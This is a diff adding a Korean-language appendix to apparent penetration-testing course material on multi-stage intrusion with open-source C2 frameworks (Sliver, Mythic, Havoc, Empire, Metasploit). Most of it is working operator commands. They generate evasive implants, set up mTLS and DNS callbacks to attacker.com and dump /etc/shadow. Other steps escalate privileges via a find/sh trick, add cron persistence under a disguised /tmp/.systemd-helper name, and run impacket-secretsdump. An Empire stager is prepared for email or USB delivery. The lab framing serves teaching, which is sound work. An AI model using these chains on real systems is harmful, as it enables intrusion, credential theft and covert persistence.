@@ -958,3 +958,267 @@ graph LR
 
 **학생 액션**: dataset 392 사례를 ATT&CK 매핑.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course12 — Week 02 다단계 침투)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | metasploit Initial Access | **metasploit** + msfvenom |
+| s2 | sliver C2 (modern) | **sliver** (Go, Bishop Fox) |
+| s3 | Mythic C2 (multi-platform) | **Mythic** (SpecterOps) |
+| s4 | Havoc C2 (newer) | **Havoc** |
+| s5 | Empire (PowerShell) | Empire (BC Security) |
+| s6 | Cobalt Strike alts | **Brute Ratel** (commercial) / sliver |
+| s7 | Beacon vs Session | sliver beacon vs session |
+| s8 | 다단계 chain | metasploit → sliver → privesc |
+
+### 학생 환경 준비
+
+```bash
+ssh ccc@192.168.0.112
+
+# 1) Metasploit (이미 설치)
+msfconsole --version
+
+# 2) Sliver (modern OSS C2 — Go)
+curl https://sliver.sh/install | sudo bash
+# 또는:
+go install github.com/bishopfox/sliver@latest
+
+# 3) Mythic (multi-platform C2 framework)
+git clone https://github.com/MythicMeta/Mythic --recursive ~/mythic
+cd ~/mythic && sudo ./mythic-cli install -f
+
+# 4) Havoc (modern C2)
+git clone https://github.com/HavocFramework/Havoc ~/havoc
+cd ~/havoc && make ts-build  # client (Qt)
+cd ~/havoc/teamserver && make  # server
+
+# 5) Empire (PowerShell C2)
+git clone --recursive https://github.com/BC-SECURITY/Empire ~/empire
+
+# 6) pwncat-cs (modern netcat)
+pip install pwncat-cs
+```
+
+### 핵심 — Sliver C2 (사실상 OSS 표준)
+
+```bash
+# === 1. Server 시작 ===
+sliver-server
+# 또는
+sudo systemctl start sliver
+
+# === 2. mTLS Listener ===
+sliver > mtls --lhost 192.168.0.112 --lport 443
+
+# === 3. HTTP/S Listener (방화벽 우회) ===
+sliver > https --lhost 192.168.0.112 --lport 443
+
+# === 4. DNS Listener (가장 은닉) ===
+sliver > dns --domains attacker.com.,c2.attacker.com.
+
+# === 5. Implant 생성 ===
+# Beacon (간헐적 callback — OPSEC 우수)
+sliver > generate beacon \
+    --mtls 192.168.0.112:443 \
+    --os linux \
+    --arch amd64 \
+    --evasion \
+    --save /tmp/sliver-beacon
+
+# Session (지속 connection)
+sliver > generate \
+    --mtls 192.168.0.112:443 \
+    --os linux \
+    --arch amd64 \
+    --save /tmp/sliver-session
+
+# Format 옵션
+# --format exe (Win)
+# --format shared (Linux .so)
+# --format shellcode (raw)
+
+# === 6. Implant 실행 (target 에서) ===
+chmod +x /tmp/sliver-beacon
+./sliver-beacon &
+
+# === 7. Server 측 — sessions ===
+sliver > sessions
+# 출력:
+# ID  Transport  Hostname  Username  OS  Health
+# 1   mtls       target    user      linux  alive
+
+# === 8. 사용 (interactive) ===
+sliver > use 1
+sliver (target) > shell
+# 풀 PTY shell
+
+# === 9. 다양한 명령 ===
+# 파일 시스템
+sliver (target) > ls
+sliver (target) > cat /etc/passwd
+sliver (target) > download /etc/shadow
+sliver (target) > upload /tmp/payload /tmp/
+
+# 네트워크
+sliver (target) > netstat
+sliver (target) > portfwd add --remote 22 --local 2222    # SSH 포트 포워드
+
+# Privesc
+sliver (target) > getuid
+sliver (target) > exec sudo find / -exec /bin/sh \; -quit  # GTFOBins
+
+# Persistence
+sliver (target) > exec /tmp/install-persist.sh
+
+# Lateral
+sliver (target) > impersonate user2  # Win
+sliver (target) > exec ssh user@10.20.30.100
+
+# 종료
+sliver (target) > background
+sliver > kill 1
+```
+
+### Mythic C2 (multi-platform — Apollo agent 등)
+
+```bash
+# 1) 시작
+cd ~/mythic
+sudo ./mythic-cli start
+
+# Web UI: https://localhost:7443
+# 기본 계정: mythic_admin / 자동 생성 password
+
+# 2) Agent install (Web UI)
+# Agents → Install → 다운로드:
+# - Apollo (.NET, Win)
+# - Poseidon (Go, Linux/macOS)
+# - Athena (.NET, modern)
+# - Medusa (Python)
+
+# 3) C2 Profile install
+# C2 Profiles → Install:
+# - http
+# - https
+# - dns
+# - websocket
+# - smb (lateral)
+
+# 4) Payload 생성
+# Web UI → Create Payload → Apollo + http
+# 자동 컴파일된 binary 다운로드
+
+# 5) Agent 배포 → Mythic 에 자동 callback
+```
+
+### Empire (PowerShell C2 — Win 환경)
+
+```bash
+# 1) 시작
+cd ~/empire
+sudo ./ps-empire server
+
+# Client
+sudo ./ps-empire client
+# 또는 Web UI: http://localhost:1337
+
+# 2) Listener
+(Empire) > listeners
+(Empire) > uselistener http
+(Empire) > set Host http://192.168.0.112:80
+(Empire) > execute
+
+# 3) Stager 생성 (다양한 형식)
+(Empire) > usestager multi/launcher
+(Empire) > set Listener http
+(Empire) > generate
+# powershell -W h -nop -enc <base64> 출력 → email/USB 으로 전달
+
+# 4) Agent 활성 시 사용
+(Empire) > agents
+(Empire) > interact <agent-name>
+(<agent>) > shell whoami
+```
+
+### 다단계 침투 시나리오 (Metasploit → Sliver → Privesc)
+
+```bash
+# === Phase 1: Initial Access (Metasploit exploit) ===
+msfconsole -q -x "
+use exploit/...
+set RHOSTS 10.20.30.80
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.0.112
+set LPORT 4444
+exploit -j
+"
+
+# Meterpreter session 획득
+# session 1 opened
+
+# === Phase 2: Sliver implant 업로드 (지속성) ===
+meterpreter > upload /tmp/sliver-beacon /tmp/.systemd-helper
+meterpreter > shell
+$ /tmp/.systemd-helper &
+$ exit
+
+# Sliver session 활성
+sliver > sessions
+# 1   mtls   target
+
+# === Phase 3: Sliver 으로 privesc ===
+sliver > use 1
+sliver (target) > shell
+$ sudo -l
+$ exit
+
+# (target) > getsystem  # Win 한정
+# (target) > exec sudo find / -exec /bin/sh \; -quit  # Linux
+
+# === Phase 4: Persistence (sliver 자체) ===
+sliver (target) > generate beacon --save /tmp/p.bin
+sliver (target) > exec '(crontab -l; echo "*/30 * * * * /tmp/p.bin") | crontab -'
+
+# === Phase 5: Lateral ===
+sliver (target) > portfwd add --remote 22 --local 2222
+# attacker 에서:
+ssh -p 2222 user@127.0.0.1                                # target 의 22 포트로 SSH
+
+# 또는:
+sliver (target) > netstat
+# 발견: 10.20.30.100:445 (SMB)
+sliver (target) > exec impacket-secretsdump 'admin:Pa\$\$w0rd@10.20.30.100'
+
+# === Phase 6: Impact ===
+# 자격증명 dump 획득 → AD 침투 (course13)
+```
+
+### Beacon vs Session 비교 (Sliver)
+
+| 특성 | Beacon | Session |
+|------|--------|---------|
+| Callback 주기 | 간헐적 (5분~1시간) | 지속 (실시간) |
+| OPSEC | 우수 (탐지 어려움) | 약함 (long-lived TCP) |
+| 명령 응답 | 다음 callback 까지 대기 | 즉시 |
+| 사용 | APT (long-term) | Hands-on testing |
+| 탐지 | 어려움 (jitter) | TCP keepalive 패턴 |
+| 권장 | Production | Lab |
+
+### Modern C2 비교
+
+| C2 | 언어 | 강점 | 약점 | 사용처 |
+|----|------|------|------|--------|
+| **Sliver** | Go | OSS, 가장 modern | Win 환경 한정적 | 사실상 표준 |
+| **Mythic** | Python + Go | Multi-platform, framework | 복잡 | Multi-OS APT |
+| **Havoc** | C++ | Cobalt Strike-like | 미성숙 | 새로운 시도 |
+| **Empire** | PowerShell | Win/AD 강력 | Win 한정 | AD 환경 |
+| **Metasploit** | Ruby | 전통적, 풍부한 modules | 시그니처 검출 쉬움 | 학습 / 빠른 PoC |
+| **pwncat-cs** | Python | netcat replacement | 단순 | Lab / CTF |
+
+학생은 본 2주차에서 **Metasploit + Sliver + Mythic + Empire + pwncat-cs** 5 C2 framework 로 다단계 침투 (Initial Access → Persistence → Privesc → Lateral) 의 OSS 표준 흐름을 익힌다.
